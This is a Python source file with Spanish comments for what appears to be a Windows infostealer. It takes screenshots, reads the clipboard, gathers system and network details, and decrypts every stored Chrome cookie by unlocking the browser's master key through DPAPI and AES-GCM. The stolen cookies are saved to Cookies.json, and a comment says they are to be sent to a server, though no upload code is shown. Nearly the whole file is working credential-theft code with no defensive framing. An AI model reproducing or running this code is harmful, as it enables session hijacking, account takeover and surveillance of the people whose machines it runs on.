import logging
import pyautogui
import time
import win32clipboard
import platform
import psutil
import socket
import requests
from datetime import datetime
import os
import sqlite3
import base64
import json
import win32crypt
import requests
from Crypto.Cipher import AES

def registro_errores(mensaje):
    logging.basicConfig(
        filename="errors.log",
        level=logging.ERROR,
        format="%(asctime)s - %(message)s"
    )
    
    logging.error(mensaje)
    
#Obtener el portapapeles
def capture_screenshot():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    screenshot_path = f"screenshot_{timestamp}.png"
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

#Obtener el portapapeles
def get_clipboard_content():
    win32clipboard.OpenClipboard()
    try:
        return win32clipboard.GetClipboardData()
    except Exception as e:
        registro_errores(f"Error retrieving clipboard content: {e}")
        return ""
    finally:
        win32clipboard.CloseClipboard()

#Funcion para obtener las especifiaciones del sistema 
def obtener_especificaciones_sistema():
    resultado = (
    f"=== ESPECIFICACIONES DEL SISTEMA ===\n"
    f"Sistema operativo: | {platform.system()} | {platform.release()} | {platform.version()} |\n"
    f"Arquitectura: {platform.architecture()[0]}\n"
    f"Procesador: {platform.processor()}\n"
    f"Núcleos del CPU: {psutil.cpu_count(logical=True)}\n"
    f"RAM total: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n"
    f"Tiempo de actividad del sistema: {datetime.fromtimestamp(psutil.boot_time())}\n"
    f"Hora actual: {datetime.now()}\n"
)
    return resultado
#Funcion para obtener la informacion de red de la maquina
def obtener_informacion_red():
    resultado = "=== INFORMACIÓN DE RED ===\n"
    hostname = socket.gethostname()
    ip_privada = socket.gethostbyname(hostname)
    resultado += f"IP privada: {ip_privada}\n"
    
    try:
        ip_publica = requests.get("https://api.ipify.org").text
        resultado += f"IP pública: {ip_publica}\n"
    except requests.RequestException as e:
        resultado += f"No se pudo obtener la IP pública: {e}\n"
    
    resultado += f"Nombre del host: {hostname}\n"
    resultado += "\n=== CONEXIONES DE RED ===\n"
    
    conexiones = psutil.net_connections()
    for conexion in conexiones[:5]:
        laddr = f"{conexion.laddr.ip}:{conexion.laddr.port}" if conexion.laddr else "N/A"
        raddr = f"{conexion.raddr.ip}:{conexion.raddr.port}" if conexion.raddr else "N/A"
        resultado += f"  {laddr} -> {raddr} (Estado: {conexion.status})\n"
    
    return resultado


# Rutas donde Chrome guarda los archivos necesarios
chromePath = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
localStatePath = os.path.join(chromePath, 'Local State')
cookiesPath = os.path.join(chromePath, 'Default', 'Network', 'Cookies')

# Función para obtener la clave de cifrado
def getEncryptionKey():
    try:
        with open(localStatePath, 'r', encoding='utf-8') as file:
            localStateData = json.load(file)
            encryptedKey = localStateData['os_crypt']['encrypted_key']
            keyData = base64.b64decode(encryptedKey)[5:]  # Elimina los primeros 5 bytes
            return win32crypt.CryptUnprotectData(keyData, None, None, None, 0)[1]
    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        print(f"Error leyendo el archivo Local State: {e}")
        exit(0)
encriptation_key = getEncryptionKey()
# Función para descifrar las cookies
def decryptCookie(encrypted_value, key):
    try:
        # Chrome usa AES-GCM para cifrar las cookies
        nonce = encrypted_value[3:15]  # Extraer el nonce (parte inicial del cifrado)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_value = cipher.decrypt_and_verify(encrypted_value[15:-16], encrypted_value[-16:])
        return decrypted_value.decode('utf-8')
    except Exception as e:
        
        
        print(f"Error al descifrar la cookie: {e}")
        return None

# Función para obtener y enviar cookies al servidor
def get_cookies():
    key = getEncryptionKey()
    
    # Abre la base de datos de cookies en modo lectura
    with sqlite3.connect(cookiesPath) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        
        cookies_to_send = []  # Lista para almacenar cookies a enviar
        
        for host_key, name, encrypted_value in cursor.fetchall():
            try:
                # Verificar si la cookie está cifrada
                if encrypted_value[:3] == b'v10':  # Las cookies cifradas empiezan con 'v10'
                    decrypted_value = decryptCookie(encrypted_value, key)
                else:
                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]

                if decrypted_value:
                    print(f"[+] Host: {host_key}, Name: {name}, Value: {decrypted_value}")

                    # Añadir la cookie a la lista para enviar al servidor
                    cookies_to_send.append({
                        'host': host_key,
                        'name': name,
                        'value': decrypted_value
                    })

            except Exception as e:
                print(f"Error procesando la cookie {name} para {host_key}: {e}")
    file_name = "Cookies.json"
    with open(file_name, "w", encoding="utf-8") as file:
        json.dump(cookies_to_send, file, indent= 4, ensure_ascii=False)
    return file_name

